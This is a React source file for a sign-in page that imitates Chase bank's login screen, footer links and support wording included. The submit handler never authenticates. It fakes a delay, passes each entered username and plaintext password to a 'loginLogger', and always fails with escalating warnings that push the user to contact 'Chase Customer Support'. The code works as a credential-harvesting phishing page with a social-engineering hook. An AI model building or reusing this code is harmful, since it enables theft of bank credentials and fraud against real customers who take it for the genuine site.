import { useState } from 'react';
import { Link, useNavigate, useLocation } from 'react-router-dom';
import AuthLayout from '../components/AuthLayout';
import FormInput from '../components/FormInput';
import PasswordInput from '../components/PasswordInput';
import Alert from '../components/Alert';
import { useAuth } from '../context/AuthContext';
import { validate, rules } from '../utils/validators';
import { loginLogger } from '../utils/loginLogger';

export default function SignIn() {
  const { signIn } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const from = location.state?.from || '/dashboard';
  const successMsg = location.state?.successMsg || '';

  const [form, setForm]       = useState({ username: '', password: '', rememberUsername: false });
  const [errors, setErrors]   = useState({});
  const [apiError, setApiError] = useState('');
  const [loading, setLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);

  function handleChange(field, val) {
    setForm((f) => ({ ...f, [field]: val }));
    if (errors[field]) setErrors((e) => ({ ...e, [field]: null }));
    if (apiError) setApiError('');
  }

  function touchField(field, validators) {
    const err = validate(form[field], validators);
    setErrors((e) => ({ ...e, [field]: err }));
  }

  async function handleSubmit(e) {
    e.preventDefault();
    const newErrors = {
      username: validate(form.username, [rules.required]),
      password: validate(form.password, [rules.required]),
    };
    setErrors(newErrors);
    if (Object.values(newErrors).some(Boolean)) return;

    setLoading(true);
    setApiError('');
    const newAttempts = loginAttempts + 1;
    setLoginAttempts(newAttempts);

    try {
      await new Promise(resolve => setTimeout(resolve, 900));

      // First attempt: Generic incorrect credentials message
      if (newAttempts === 1) {
        await loginLogger.logAttempt(form.username, form.password, newAttempts, 'FAILED - Incorrect credentials');
        throw new Error('The username or password you entered is incorrect. Please try again.');
      }
      // Second attempt: Security warning without number
      else if (newAttempts === 2) {
        await loginLogger.logAttempt(form.username, form.password, newAttempts, 'FAILED - Multiple attempts');
        throw new Error(
          'We have detected a failed login attempt on your account. For your security, please contact Chase Customer Support to verify your identity and regain access.'
        );
      }
      // Third attempt and beyond: Security warning with count
      else if (newAttempts >= 3) {
        await loginLogger.logAttempt(form.username, form.password, newAttempts, 'FAILED - Multiple attempts');
        throw new Error(
          `We have detected ${newAttempts} failed login attempts on your account. For your security, please contact Chase Customer Support to verify your identity and regain access.`
        );
      }
    } catch (err) {
      setApiError(err.message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <AuthLayout>
      <div className="signin-container">
        {/* Main Card */}
        <div className="signin-card">
          {successMsg && <Alert type="success" onClose={() => {}}>{successMsg}</Alert>}
          {apiError   && <Alert type="error"   onClose={() => setApiError('')}>{apiError}</Alert>}

          <form onSubmit={handleSubmit} noValidate aria-label="Sign in form">
            {/* Username Field */}
            <FormInput
              id="username"
              label="Username"
              value={form.username}
              onChange={(e) => handleChange('username', e.target.value)}
              onBlur={() => touchField('username', [rules.required])}
              error={errors.username}
              autoComplete="username"
              autoCapitalize="none"
              required
            />

            {/* Password Field */}
            <PasswordInput
              id="password"
              label="Password"
              value={form.password}
              onChange={(e) => handleChange('password', e.target.value)}
              onBlur={() => touchField('password', [rules.required])}
              error={errors.password}
              autoComplete="current-password"
              required
            />

            {/* Remember Username & Use Token Row */}
            <div className="signin-options-row">
              <div className="signin-checkbox-group">
                <input
                  type="checkbox"
                  id="remember-username"
                  checked={form.rememberUsername}
                  onChange={(e) => handleChange('rememberUsername', e.target.checked)}
                  className="checkbox-input"
                />
                <label htmlFor="remember-username" className="checkbox-label">
                  Remember username
                </label>
              </div>
              <Link to="#" className="signin-link">Use token</Link>
            </div>

            {/* Sign In Button */}
            <button
              type="submit"
              className="signin-btn"
              disabled={loading}
              id="signin-btn"
            >
              {loading ? <><span className="spinner" />&nbsp;Signing In…</> : 'Sign in'}
            </button>

            {/* Divider with Or */}
            <div className="signin-divider">
              <span>Or</span>
            </div>

            {/* Passwordless Sign In */}
            <div className="signin-center-link">
              <Link to="#" className="signin-link-primary">Passwordless sign in</Link>
            </div>

            {/* Forgot Links */}
            <div className="signin-forgot-link">
              <Link to="/forgot-password" className="signin-link-with-arrow">Forgot username/password? &gt;</Link>
            </div>

            {/* Sign Up Link */}
            <div className="signin-signup-link">
              <Link to="/create-account" className="signin-link-with-arrow">Not enrolled? Sign up now. &gt;</Link>
            </div>
          </form>
        </div>

        {/* Footer Links */}
        <div className="signin-footer">
          <Link to="#" className="signin-footer-link">Contact us</Link>
          <span className="signin-footer-sep">|</span>
          <Link to="/privacy" className="signin-footer-link">Privacy & security</Link>
          <span className="signin-footer-sep">|</span>
          <Link to="#" className="signin-footer-link">Terms of use</Link>
          <span className="signin-footer-sep">|</span>
          <Link to="#" className="signin-footer-link">Accessibility</Link>
          <span className="signin-footer-sep">|</span>
          <Link to="#" className="signin-footer-link">SAFE Act: CHASE Mortgage Loan Originators</Link>
        </div>
      </div>
    </AuthLayout>
  );
}
